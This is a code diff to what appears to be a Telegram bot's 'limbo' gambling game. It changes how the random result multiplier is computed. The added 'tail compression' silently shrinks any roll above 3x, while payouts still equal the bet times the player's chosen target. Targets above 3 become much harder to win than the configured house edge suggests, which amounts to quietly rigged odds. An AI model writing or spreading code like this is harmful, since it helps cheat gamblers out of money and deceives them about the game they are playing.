@@ -3,7 +3,9 @@ from wallet import get_balance, adjust_balance, record_bet, get_house_balance
 from settings import get_min_bet, get_max_bet, get_house_edge
 
 MIN_MULTIPLIER = 1.01
-MAX_MULTIPLIER = 1000
+MAX_MULTIPLIER = 100
+TAIL_THRESHOLD = 3      # rolls above this get compressed
+TAIL_COMPRESSION = 0.3  # how much of the excess above TAIL_THRESHOLD carries through
 
 
 def parse_multiplier(text: str):
@@ -37,7 +39,12 @@ def play_limbo(bot, chat_id, telegram_id: int, bet_amount: float, target_multipl
 
     edge = get_house_edge()
     r = random.random()
-    result = min(MAX_MULTIPLIER * 10, (1 - edge) / (1 - r)) if r < 1 else MAX_MULTIPLIER * 10
+    raw = (1 - edge) / (1 - r) if r < 1 else MAX_MULTIPLIER
+    if raw <= TAIL_THRESHOLD:
+        result = raw
+    else:
+        result = TAIL_THRESHOLD + (raw - TAIL_THRESHOLD) * TAIL_COMPRESSION
+    result = min(result, MAX_MULTIPLIER)
     won = result >= target_multiplier
 
     payout = round(bet_amount * target_multiplier, 2) if won else 0
